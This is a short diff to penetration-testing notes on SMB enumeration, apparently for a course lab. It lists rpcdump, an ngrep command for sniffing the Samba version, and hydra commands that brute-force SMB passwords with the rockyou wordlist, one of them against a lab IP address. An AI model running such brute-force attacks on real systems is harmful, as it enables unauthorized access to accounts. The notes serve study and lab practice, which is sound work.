@@ -142,8 +142,10 @@ rpcdump.py $TARGET
 # Getting the smb version when other methods fail (or port 139 is only available)
 ngrep -i -d tap0 's.?a.?m.?b.?a.*[[:digit:]]' port 139
 
-# brute
+# brute -l = individual user
 hydra -l manager -P /usr/share/wordlists/rockyou.txt $TARGET smb
+or - L = list of users
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smb://10.11.1.115/
 
 # helpful resource
 https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html
